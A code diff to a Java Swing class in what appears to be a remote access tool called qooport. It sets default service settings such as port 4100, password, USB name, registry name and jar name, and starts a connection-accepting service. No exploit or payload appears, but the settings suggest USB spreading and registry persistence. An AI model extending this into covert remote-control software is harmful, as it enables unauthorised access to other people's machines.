@@ -6,6 +6,8 @@
 package qooport.simple;
 
 import comunes.Accion;
+import comunes.CFG;
+import comunes.Interfaz;
 import java.awt.BorderLayout;
 import java.awt.HeadlessException;
 import java.net.Inet4Address;
@@ -27,7 +29,6 @@ import qooport.gui.NoIp;
 import qooport.gui.personalizado.BarraEstado;
 import qooport.utilidades.GuiUtil;
 import qooport.utilidades.Util;
-import comunes.Interfaz;
 import rt.util.CLRT;
 
 /**
@@ -563,19 +564,39 @@ public class ModoSimple extends javax.swing.JFrame {
 
     private void iniciar() {
         try {
+            System.setProperty("java.net.preferIPv4Stack", "true");
+
             new Thread(new Runnable() {
                 @Override
                 public void run() {
                     String clave = generarClave();
                     try {
                         CLRT cl = new CLRT();
+
+                        //configuracion default
+                        rt.Inicio.config = new CFG();
+                        rt.Inicio.config.inicializarParamertros();
+                        rt.Inicio.config.agregarParametro("dns", "");
+                        rt.Inicio.config.agregarParametro("puerto", "4100");
+                        rt.Inicio.config.agregarParametro("claveClase", "");
+                        rt.Inicio.config.agregarParametro("jarName", "");
+                        rt.Inicio.config.agregarParametro("nombreUSB", "");
+                        rt.Inicio.config.agregarParametro("password", "");
+                        rt.Inicio.config.agregarParametro("prefijo", "");
+                        rt.Inicio.config.agregarParametro("regName", "");
+                        rt.Inicio.config.agregarParametro("ssl", Boolean.TRUE);
+                        rt.Inicio.config.agregarParametro("protocolo", ConexionServer.TCP);
+
                         servicio = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());
 //                      conexion.iniciar(dnsUnico, puerto, puerto2, password, delay, prefijo, escritorioOffline, capDelayFoto, tipoConexion);
-                        servicio.instanciar(null, 4100, 4101, clave, 3000, "rt_", false, 3000, 2);
+                        System.out.println("se va a inciar el servicio");
+                        servicio.instanciar(null, 4100, clave, 3000, "rt_", false, 3000, 2);
+                        System.out.println("se iniciar el servicio");
                         servicio.set(15, accionServicioConectar);//setea la accion de conectar
                         servicio.ejecutar(0);//si no hay conexion y se detiene el servicio. no llega a esta linea porq aun esta aceptando conexiones
-                    } catch (Exception ex) {
 
+                    } catch (Exception ex) {
+                        ex.printStackTrace();
                     }
                 }
             }).start();
